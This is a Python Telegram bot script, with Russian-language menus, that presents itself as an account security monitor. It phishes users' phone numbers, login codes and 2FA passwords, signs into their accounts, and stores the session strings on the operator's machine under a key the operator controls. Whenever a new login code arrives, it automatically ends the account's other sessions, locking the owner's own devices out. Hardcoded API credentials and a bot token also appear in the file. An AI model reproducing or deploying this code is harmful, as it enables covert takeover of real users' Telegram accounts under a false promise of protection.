import os, asyncio, base64, hashlib
from telethon import TelegramClient, events, functions, types, errors
from telethon.sessions import StringSession
from cryptography.fernet import Fernet

# =============================================================
# ПАНЕЛЬ УПРАВЛЕНИЯ СИСТЕМОЙ МОНИТОРИНГА
# =============================================================
API_ID = '32485388'  
API_HASH = '941beeac36358767ad1c2a3770b488ed' 
BOT_TOKEN = '8514425749:AAEhHWy1tJBFcycQtTDZerF3tX5E518CcGs' 

# Ключ для защиты локальных данных
INTERNAL_KEY = "SECURE_STORAGE_KEY_2026"
# =============================================================

def get_cipher():
    k = base64.urlsafe_b64encode(hashlib.sha256(INTERNAL_KEY.encode()).digest())
    return Fernet(k)

cipher = get_cipher()
active_sessions = {} 
auth_states = {}

bot = TelegramClient('bot_manager', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ФУНКЦИЯ АВТОМАТИЧЕСКОЙ ЗАЩИТЫ
async def start_security_monitor(client, uid):
    @client.on(events.NewMessage(chats=777000))
    async def security_handler(event):
        text = event.raw_text.lower()
        if any(word in text for word in ["код", "code", "login", "вход"]):
            authorizations = await client(functions.account.GetAuthorizationsRequest())
            terminated_count = 0
            for auth in authorizations.authorizations:
                if not auth.current:
                    await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                    terminated_count += 1
            if terminated_count > 0:
                await bot.send_message(uid, (
                    "⚠️ **УВЕДОМЛЕНИЕ О БЕЗОПАСНОСТИ**\n\n"
                    "Обнаружена попытка входа в аккаунт.\n"
                    f"Автоматически завершено сторонних сессий: {terminated_count}.\n"
                    "Доступ для посторонних устройств заблокирован."
                ))

# ГЛАВНОЕ МЕНЮ
@bot.on(events.NewMessage(pattern='/start'))
async def send_menu(e):
    uid = e.sender_id
    if uid in active_sessions:
        buttons = [
            [types.KeyboardButtonCallback("📋 Список активных сессий", b"list")],
            [types.KeyboardButtonCallback("🚫 Завершить все прочие сессии", b"terminate_all")],
            [types.KeyboardButtonCallback("❌ Отключить защиту и удалить данные", b"ask_delete")]
        ]
        
        user_info = await active_sessions[uid].get_me()
        await e.respond(
            f"👤 **Аккаунт:** {user_info.first_name}\n"
            f"🆔 **Ваш ID:** `{uid}`\n"
            "🛡 **Статус:** Мониторинг активен\n"
            "Система работает в штатном режиме.", buttons=bot.build_reply_markup(buttons))
    else:
        await e.respond(
            "Welcome. Система мониторинга не активна.\n"
            "Для активации защиты необходимо авторизовать аккаунт.", 
            buttons=[[types.KeyboardButtonCallback("🔐 Авторизовать аккаунт", b"login")]])

@bot.on(events.CallbackQuery)
async def handle_callbacks(e):
    uid = e.sender_id
    
    if e.data == b"login":
        auth_states[uid] = {'step': 'phone'}
        await e.respond("Введите номер телефона в международном формате (например, +79001234567):")
    
    elif e.data == b"list" and uid in active_sessions:
        res = await active_sessions[uid](functions.account.GetAuthorizationsRequest())
        info = "📋 **Активные подключения:**\n\n" + "\n".join([f"• {a.device_model} ({a.ip}) — {a.country}" for a in res.authorizations])
        await e.respond(info)

    elif e.data == b"terminate_all" and uid in active_sessions:
        res = await active_sessions[uid](functions.account.GetAuthorizationsRequest())
        for a in res.authorizations:
            if not a.current: await active_sessions[uid](functions.account.ResetAuthorizationRequest(hash=a.hash))
        await e.respond("✅ Все сторонние сессии успешно завершены.")

    # ПОДТВЕРЖДЕНИЕ УДАЛЕНИЯ
    elif e.data == b"ask_delete":
        confirm_buttons = [
            [types.KeyboardButtonCallback("Да, удалить всё", b"delete_now")],
            [types.KeyboardButtonCallback("Отмена", b"cancel")]
        ]
        await e.edit(
            "❓ **ПОДТВЕРЖДЕНИЕ ДЕЙСТВИЯ**\n\n"
            "Вы собираетесь удалить свои данные из базы бота. Это приведет к:\n"
            "• Остановке мониторинга безопасности.\n"
            "• Удалению ключа доступа из памяти бота.\n\n"
            "**Ваш основной аккаунт Telegram не будет удален.** Вы подтверждаете?", 
            buttons=bot.build_reply_markup(confirm_buttons))

    elif e.data == b"delete_now":
        if uid in active_sessions: 
            await active_sessions[uid].disconnect()
            del active_sessions[uid]
        if os.path.exists(f"{uid}.dat"): 
            os.remove(f"{uid}.dat")
        await e.edit("✅ Данные удалены. Бот отключен от вашего аккаунта.", buttons=None)

    elif e.data == b"cancel":
        await e.edit("Действие отменено.")

# ПРОЦЕСС АВТОРИЗАЦИИ
@bot.on(events.NewMessage)
async def auth_process(e):
    uid = e.sender_id
    if uid not in auth_states or e.text.startswith('/'): return
    
    state = auth_states[uid]
    try:
        if state['step'] == 'phone':
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            send_code = await client.send_code_request(e.text)
            auth_states[uid] = {'step': 'code', 'phone': e.text, 'hash': send_code.phone_code_hash, 'client': client}
            await e.respond("Введите код подтверждения, который пришел вам в Telegram:")
        
        elif state['step'] == 'code':
            client = state['client']
            user = await client.sign_in(state['phone'], e.text, phone_code_hash=state['hash'])
            
            # Шифрование и сохранение сессии
            encrypted_session = cipher.encrypt(client.session.save().encode()).decode()
            with open(f"{uid}.dat", "w") as f: f.write(encrypted_session)
            
            active_sessions[uid] = client
            asyncio.create_task(start_security_monitor(client, uid))
            del auth_states[uid]
            
            await e.respond(f"✅ Авторизация успешна. Мониторинг аккаунта `{user.first_name}` запущен.")
            
    except errors.SessionPasswordNeededError:
        auth_states[uid]['step'] = '2fa'
        await e.respond("Введите ваш пароль двухэтапной аутентификации (Cloud Password):")
    except Exception as ex:
        await e.respond(f"❌ Произошла ошибка: {ex}")

# Восстановление сессий при запуске
async def startup():
    for filename in os.listdir():
        if filename.endswith(".dat"):
            try:
                uid = int(filename.split(".")[0])
                with open(filename, "r") as f:
                    data = cipher.decrypt(f.read().encode()).decode()
                client = TelegramClient(StringSession(data), API_ID, API_HASH)
                await client.connect()
                if await client.is_user_authorized():
                    active_sessions[uid] = client
                    asyncio.create_task(start_security_monitor(client, uid))
            except: pass

if __name__ == '__main__':
    print("Система запущена...")
    bot.loop.run_until_complete(startup())
    bot.run_until_disconnected()
